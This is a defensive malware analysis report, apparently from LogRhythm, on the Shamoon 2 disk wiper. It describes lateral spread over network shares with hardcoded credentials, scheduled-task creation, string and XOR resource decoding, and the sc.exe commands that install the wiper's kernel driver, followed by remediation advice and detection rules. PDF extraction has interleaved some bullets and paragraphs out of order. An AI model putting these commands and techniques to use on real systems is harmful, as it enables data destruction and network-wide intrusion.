SHAMOON 2 MALWARE ANALYSIS REPORT

Executive Summary
About Shamoon 2
Shamoon 2 attempts to spread to other systems on the local network or Active
Directory domain of the victim system and overwrites—or wipes—files in hardcoded
directories on each system. The malware destroys data and renders the system
inoperable, while also attempting worm-like behavior in an attempt to spread the
malware to other systems on the network.
The samples contain hardcoded domain names, usernames, and passwords,
supporting the highly targeted nature of the malware. LogRhythm AI Engine
rules for detecting its presence are provided in Appendix B. The major findings
of analysis of this sample are contained within this report.
Shamoon, also known as DistTrack, was reported to be discovered on August 12,
2012 and was identified as WORM_DISTRACK.A1, as well as TROJ_WIPMBR.A, by
Symantec’s Security Response team. ICS-CERT supplied the first known public
report of Shamoon functionality within JSAR-12-241-01B2 on October 16, 2012.
This report gave written accounts of the malware’s three primary components as
well as maintained a running activity log of Shamoon discoveries and incidents
up until January 3, 2014. Reporting was found linking the Shamoon malware to
the Sony Pictures hack in 2014;3 however, this report was only substantiated by
one reporting agency. No further reporting was written until Palo Alto released a
report titled “Shamoon 2: Return of the Disttrack Wiper”4 on November 30, 2016.
ArsTechnica subsequently published two technical articles in December detailing
additional outbreaks.5

About this Report
The goal of this report is to provide actionable intelligence regarding threat
actors and the malware or other tools they use for reconnaissance, delivery,
exploitation, and so forth in order for security operations (SecOps) teams to
be empowered to more quickly detect and respond to this specific threat. This
information is also intended so that SecOps teams can utilize the intelligence in
this report in order to set up preventative measures for the malware analyzed.
In the case of a victim of this malware, this analysis can be used to understand
the impact of the malware (e.g., what damage it may have done, lateral movement,
data exfiltration, credential gathering, etc.). We also share this intelligence back to
the community to assist other researchers in their analysis of the same malware.
This threat intelligence report is based on analysis from the LogRhythm Labs team
in which we examine details of specific samples of malware belonging to a family
publicly known as “DistTrack.” The malware analyzed in this report bears many
similarities to malware used in a targeted attack named “Shamoon” in 2012.

Remediation Recommendations

• A service named “NtsSrv,” configured to run the original
malicious installer, is created and started on the initially
infected victim.

--Attempts to log to the remote system with hardcoded
credentials and copy itself to %WinDir%\system32\
ntssrvr32.exe.

If the malware is successful in wiping the affected systems,
analysts can remediate this malware from a system or
network by restoring from backup. In order to prevent
future infection and lateral movement of the malware
across the enterprise, the following actions can be taken in
addition to implementing the LogRhythm rules provided in
Appendix B. Because these mitigations have implications
across the enterprise network, it is important to assess the
impact of making these changes and ensure appropriate
policies and procedures to implement and support these
changes are evaluated.

--Decrypts and executes a Command and Control (C2)
component from its resource section, which attempts
to communicate over HTTP with a local system
named “server”.

• Ensure the latest account credential protection is
enabled on all Windows systems by verifying that
enterprise systems are kept updated with the latest
Windows Update software.

--Installs a Scheduled Task on the remote system that
is configured to run ntssrvr32.exe.

• Install Local Administrator Password Solution (LAPS)
on the domain in order to randomize local administrator
passwords for systems in the domain.

• The installer attempts to enumerate other systems on
the local network or Active Directory domain.
• If connection to a system on the local network is
successful, the installer performs the following:

--Starts the Scheduled Task on the remote system,
which drops a wiper component that renders the
system inoperable.
• If the system date of the original victim is later than
11/20/2016 8:45 PM, the installer drops the wiper
component and proceeds to overwrite files until the
original victim system is rendered inoperable.
PAGE 4

• Disable the Remote Registry service on all systems.
--Note: This action can have significant impact on
the enterprise network and should be carefully
considered. However, the service can be disabled
temporarily and easily re-enabled when mitigation
is complete.

Analysis
Summary

Obfuscation and Encryption

The main installer infects and destroys the initial system,
as well as infecting other systems on the local network or
Active Directory domain. The malware contains hardcoded
domains, usernames, and passwords for logging on to
remote systems. If the installer is successful in connecting
to the local network, it drops a communications component
that is configured to connect to a hardcoded server name.
Notably, the malware uses the same disk driver to perform
the wiping functionality as malware used in an attack named
“Shamoon” in 2012. The sample analyzed is a 32-bit version
of the malware; file metadata for all identified samples and
dropped files is presented in Appendix A.

Resource names, service names, and other strings are
encoded in the binary using a simple algorithm. These
strings are decoded at runtime by subtracting a value from
each character to get the corresponding ASCII value. For
example, subtracting 34 from each character in “rmeuST”
results in the resource name string “PKCS12”:

The embedded resources themselves are XOR encrypted
using a key that is decoded at runtime before decryption.
The encrypted data are stored at a particular offset within
each binary resource; the offset values are hardcoded in the
binary as encoded strings. Decryption proceeds as follows:
• Starting offset and size are decoded from the hardcoded
values in the binary

--Nineteen is subtracted from the ASCII value of each
character, then the resulting ASCII value is converted
to an integer, e.g. “KJL” -> “879” (str) -> 879 (int).
• The decryption key is decoded in the same way
(subtracting 19 from each ASCII value), but the result is a
Base64 encoded value that is then decoded to result in
the final key.

Table 1: File Metadata

Analysis
The main installer contains three embedded resources
named PKCS12, PKCS7, and x509, which are encrypted
components of the malware, named to masquerade as
legitimate cryptographic objects. These resources are
decrypted and dropped on either the initially infected or
remote system, depending on the operating system and
other factors.

• Starting at the calculated offset within the resource,
each byte is XOR decrypted with the decoded key as
seen in the assembly below:

SHAMOON 2 MALWARE ANALYSIS REPORT

Execution
When the analyzed sample 3947a.exe is executed with the
parameter “2”, the sample installs itself as a service named
NtsSrv on the infected host and modifies the dependencies
of the legitimate LanmanWorkstation service to include the
malicious service.
After determining the subnet of the infected machine,
3947a.exe attempts to connect to network shares on the
local network starting with the ADMIN$ share. The malware
traverses the network incrementally by IP address starting
at 1, using hardcoded domain credentials to log on to each
system. If the installer successfully connects to another host
on the subnet, it proceeds by remotely opening that system’s
registry in order to disable UAC and Wow64 redirection.
This allows the malware to test write permissions to the
%WinDir%\system32 directory, where it writes itself as
ntssrvr32.exe and changes the timestamp of the file to
match that of kernel32.dll.

3947a.exe then attempts to create a scheduled task on
the remote system that is configured to run the installer
component with the command line “ntssrvr32.exe
LocalService”. The task is created on the remote system
using the NetScheduleJobAdd API, which only allows
specification of a host and AT_INFO structure to create the
job. Notably, the AT_INFO structure does not contain a field
for specifying a task name, resulting in a default name (e.g.
At1.job) being assigned to the scheduled task. However, the
AT_INFO structure does allow specification of a start time
for the task, which the installer generates by retrieving
the system time of the remote machine and adding 90
milliseconds. Following is a screenshot from a network
capture that illustrates the job creation over the network:

SHAMOON 2 MALWARE ANALYSIS REPORT

The installer then decrypts its PKCS12 resource (the
wiper component), writes the data to %WinDir%\
System32\<filename>.exe on the initially infected machine,
and changes the timestamp of the file to match that
of kernel32.dll.
3947a.exe also writes a hardcoded public key to
%TEMP%\key8854321.pub—the purpose of which was not
determined during the course of analysis. This component
is then executed with the command line “%WinDir%\
system32\<filename>.exe 1”. The <filename> is chosen from
the list of hardcoded values below:
caclsrv.exe

dvdquery.exe

msinit.exe

sigver.exe

wcscript.exe

clean.exe

event.exe

ntfrsutil.exe

routeman.exe

ntnw.exe

fsutl.exe

dfrag.exe

ipsecure.exe

rdsadmin.exe

sfmsc.exe

extract.exe

dnslookup.exe

iissrv.exe

regsys.exe

smbinit.exe

<filename>.exe extracts and XOR decrypts the disk
driver from its resource section, writing it to %WinDir%\
system32\drivers\drdisk.sys. The wiping component then
creates a service named drdisk that is configured with
the driver drdisk.sys as the kernel driver. The service is
created and then started by the wiping component using
the following commands:
“%WinDir%\system32\cmd.exe /c sc create drdisk type= kernel start= demand binpath=
System32\Drivers\drdisk.sys 2>&1 >nul”
“%WinDir%\system32\cmd.exe /c sc start drdisk 2>&1 >nul”

The system clock is then set to a random day in August
2012 (possibly due to the license expiration of the original
driver, although this is unconfirmed). <filename>.exe then
begins overwriting files on the system, starting with
user directories and followed by the system directory
%WinDir%\system32.

SHAMOON 2 MALWARE ANALYSIS REPORT
If the previously described remote connection is
successful, 3947a.exe decrypts the communications
component contained within its PKCS7 resource, writes
it to %WinDir%\system32\netinit.exe, and changes the
timestamp of the file to match that of kernel32.dll.
When executed with the command line “%WinDir%\
system32\netinit.exe 1”, the communications component
searches for a machine on the local subnet with the
hostname “server”. If found, the component connects to
port 80 and performs the following GET request, where the
“shinu=” argument contains encoded system information:
GET

Due to the hardcoded wiping date of 11/20/2016, the
malware is unlikely to spread successfully to other
machines, because the initial victim is wiped within
minutes of infection. Unless the disk driver installation
is unsuccessful, the system is wiped before the infection
can spread to other hosts. However, if the malware is
able to retrieve the file inf_usbvideo324.pnf from the C2
server, this hardcoded date could be altered to a future
date. This file is saved to %WinDir%\inf\usbvideo324.

Remediation

In order to prevent future infection and lateral movement of
the malware across the enterprise, the following actions can
be taken in addition to implementing the LogRhythm rules
provided in Appendix B. Because these mitigations have
implications across the enterprise network, it is important
to assess the impact of making these changes and ensure
appropriate policies and procedures to implement and
support these changes are evaluated.

If the malware is successful in wiping the affected systems,
analysts can remediate this malware from a system or
network only by restoring from backup.

The Shamoon malware does not rely on exploiting
application or operating system vulnerabilities to
be successful.6 Instead, it uses hardcoded Windows
Active Directory credentials and weak domain security
configurations to infect and spread across the enterprise.
Prevention of this type of attack requires hardening of the
security policy on the network. Following are examples of
security measures that should be implemented and how
each prevents attacks such as Shamoon:
1. Ensure the latest account credential protection is
enabled on all Windows systems by verifying that
enterprise systems are kept updated with the latest
Windows Update software. Microsoft’s 2871997 update7
(released May 13th, 2014) improves account credential
security, making credential dumping attacks less
successful. This helps to prevent the harvesting of
domain credentials that can be used for subsequent
attacks and lateral movement across a domain.

Conclusion
The Shamoon malware campaign began in 2012 and reemerged with a new, modified version of the 2012 samples
in November 2016. In that month, there were two targeted
waves of attacks that attempted to wipe systems across
networks of multiple Saudi Arabian industries. A third wave
of attacks occurred in January of 2017, again targeting
Saudi Arabian industries. Although the responsible actors
for the third wave of attacks are presumed to be the
same, the malware was updated with more sophisticated
functionality such as encryption, anti-debugging, and
process hollowing techniques.10
Intelligence gained from security researchers investigating
these waves of attacks suggests that the Shamoon campaign
is ongoing. Research published by Kaspersky 11 reports
that a new wiper (which they have named StoneDrill) was
discovered in Europe, suggesting that the actor group may
be expanding their operations beyond the Middle East. For
this reason, LogRhythm Threat Research will continue to
monitor Shamoon activity, and report on the analysis of any
future discoveries.

2. On May 1, 2015, Microsoft made the Local Administrator
Password Solution (LAPS) software available for
download.8 When installed, LAPS makes the elevation
of local credentials to domain credentials more difficult
by ensuring the local administrator account password
is not reused on every domain system. This prevents
lateral movement by an attacker using the same
credentials to logon to multiple systems.
3. Disable the Remote Registry service on all systems.9
Shamoon relies on the Remote Registry system to
disable User Account Control on the remote target,
allowing the malware to install itself in the %WinDir%\
system32 directory and create a Scheduled Task
without alerting the user.
As an initial delivery vector was not recovered by the analysts, the method used to drop the Shamoon binary is unknown.

Note: This action can have significant impact on the enterprise network and should be carefully considered. However, the service can be disabled
temporarily and easily re-enabled when mitigation is complete.

SHAMOON 2 MALWARE ANALYSIS REPORT

Appendix B:
LogRhythm Detection Rules
Description

Dropper AI Engine Rules

The following appendix contains LogRhythm AI Engine
Detection rules applicable to known Shamoon malware
samples obtained.

The AI Engine Dropper : Disabled UAC Registry rule is a
generic rule that does not inherently identify the presence
of Shamoon, but it does alert the analyst of the highly
suspicious event of a user disabling the User Access Control
controls. Disabling this control allows administrative actions
to be performed on the system without prompting the user.
Shamoon requires that UAC be disabled to continue with the
installation of the Reporting and Wiping components. See
Figure 2.

LogRhythm AI Engine Rules
Pre-Dropper AI Engine Rule
The Pre-Dropper : SMB Connection, Admin Access, and File
Drop AI Engine rule is a three-block rule triggering upon
an SMB connection, followed by a confirmed read access
to the the C:\Windows\System32\csrss.exe file, followed
by the creation of an executable within the C:\Windows\
System32 directory. There is the possibility for this series
of actions to be a false positive, but this chance is to be
considered relatively rare. See Figure 1.

Figure 2: Dropper : Disabled UAC Registry

Figure 1: Pre-Dropper : SMB Connection, Admin Access, File Drop

WWW.LOGRHYTHM.COM

PAGE 21

SHAMOON 2 MALWARE ANALYSIS REPORT

The Dropper : Remote cmd.exe execution AI Engine rule
is designed to trigger upon the specific Shamoon cmd.exe
execution command used to initiate the installation of
Shamoon on remote systems within the network. This AI
Engine rule requires that LogRhythm has the capability to
ingest command execution log sources that will be used to
trigger this alarm. Within the Windows architecture, the log
source ‘MS Event Log for Win7/Win8/2008/2012 – Sysmon’
can be used to identify this type of activity as well as
several commercial endpoint security agents. It is unlikely
this rule will trigger false positive alerts. See Figure 3.

The Dropper : Scheduled Task Creation AI Engine rule again
does not directly imply a Shamoon infection; however, it
does alert upon the highly suspicious action of local system
scheduled task creation. Should a scheduled task be created
upon a system, the system administrator for the system
needs to be contacted to ensure it is not a false positive.
Shamoon creates a scheduled task to initiate wiping of
the system. The default execution time for this task is
hardcoded in the binary, although the value can be updated
by the C2 node after successful communication. This rule
could trigger false positive alerts. See Figure 4.

Figure 4: Dropper : Scheduled Task Creation

Figure 3: Dropper : Remote cmd.exe execution

The Dropper : Service Modification AI Engine rule triggers
upon the successful modification of the LanmanWorkstation
service’s “DependOnService” value. Upon infection with
Shamoon, the malware appends the malicious service (e.g.
NtsSrv) to the “DependOnService” value. It is unlikely this
rule will trigger a false positive alert. See Figure 5.

Figure 5: Dropper : Service Modification

PAGE 22

WWW.LOGRHYTHM.COM

SHAMOON 2 MALWARE ANALYSIS REPORT

The Dropper : Wiper File Drop AI Engine rule triggers upon
the presence of any of the following system drivers being
created within the C:\Windows\System32\Drivers directory:
elrawdisk.sys, drdisk.sys, or vdsk911.sys. While it is possible
that future iterations of Shamoon may not use these same
driver names, these are the only values that are currently
known to exist both within previous reporting as well as
within in-house malware analysis. It is not likely this rule will
trigger false positive alerts. See Figure 6.

Figure 7: Dropper : ConfirmationC2 Reporting AI Engine Rules

C2 Reporting AI Engine Rules
The Reporter : User-Agent String C2 Request AI Engine
rule is designed to trigger upon detection of the known
Shamoon C2 callout signature. This callout will be directed
to an external C2 node from the compromised internal
system. Detection of this C2 callout should not generate
any known false positive alerts. See Figure 8.

Figure 6: Dropper : Wiper File Drop

The Dropper : Confirmation AI Engine rule is a catch-all
rule that is used to rule out false-positive rules. This rule
requires at least three of the Dropper family Shamoon rules
to be triggered before the Confirmation rule is triggered.
This rule has many beneficial capabilities for active defense
response measures to be taken in response to a Shamoon
infection and potentially has the capability to protect
the network at large from a wide scale exposure to a
Shamoon infection. For additional information on potential
LogRhythm SmartResponse™ actions, continue to the
following section. See Figure 7.
Figure 8: Reporter : User-Agent String C2 Request

WWW.LOGRHYTHM.COM

PAGE 23

SHAMOON 2 MALWARE ANALYSIS REPORT

The Reporter : C2 File Preparation AI Engine rule is designed
to detect the creation or modification of the file C:\Windows\
System32\netinit.exe. This file is the component of the
malware responsible for communications with the C2 node.
This file is decrypted from the PKCS7 resource in the dropper
binary. It is unlikely this rule will trigger a false positive alert.
See Figure 9.

Figure 10: Reporter : C2 Response, File Creation

Wiper-Specific AI Engine Rule

Figure 9: Reporter : C2 File Preparation

The Reporter : C2 Response, File Creation AI Engine rule
is designed to trigger upon the successful creation of a file
within the C:\Temp\Temp\filer or C:\Users\<user>\AppData\
Local\Temp directories. Shamoon uses these locations to
write timestamp information and additional downloads. This
rule is likely to trigger a false positive alerts due to the high
usage of the user’s %Temp% directory. See Figure 10.

The Wiper : Timestamp File Creation AI Engine rule is
the final Shamoon rule available to be detected before
the wiper service begins the wiping process. This rule
is designed to detect the creation of the timestamp file
containing the updated time at which the wiping process
should begin. This rule is not likely to generate false
positive alerts. See Figure 11.

LogRhythm SmartResponse Plug-ins
SmartResponse™ plug-ins allow LogRhythm-triggered alarms to initiate a subsequent action. Within the context of this
report, the following SmartResponse plug-ins are paired with the alarm: ‘Dropper : Confirmation’. The AI Engine rule
‘Dropper: Confirmation’ was selected as the rule to pair these SmartResponses, as it signifies the earliest point in which
the Shamoon 2.0 infection can truly be confirmed with the lowest levels of false positive events occurring. This is not the
only point a LogRhythm SmartResponse can be used to mitigate Shamoon 2 activities, but it represents LogRhythm’s
recommended actions for this type of event.

Disable AD Account
The Disable AD Account SmartResponse plug-in is designed to remove Active Directory domain access for the compromised
user account that is being used to propagate the Shamoon infection. This action has the desired impact of isolating
the infected system from any other system to which that user may have access. This SmartResponse plug-in does not
represent a 100% effective method of halting the Shamoon malware from moving through the environment, but it does
pose an effective solution.

SHAMOON 2 MALWARE ANALYSIS REPORT

Disable Local System Account
The Disable Local System Account SmartResponse plug-in is designed to remove the local user account which is being used
to propagate the Shamoon infection from other systems with the same local system account. This action has the desired
impact of isolating the infected system from any other system on which that user may have access from the same local
user account. This SmartResponse plug-in does not represent a 100% effective method of halting the Shamoon malware
from moving through the environment, but it does pose an effective solution.

Quarantine by IP Address – Cisco Specific
The Quarantine by IP Address SmartResponse plug-in is a Cisco-specific plug-in that will place the infected Shamoon system
in quarantine, preventing any inbound or outbound communications from that system from affecting any other network or
external system. This SmartResponse plug-in will not prevent Shamoon from wiping the infected system, but it will protect the
any surrounding or vulnerable systems from being infected.
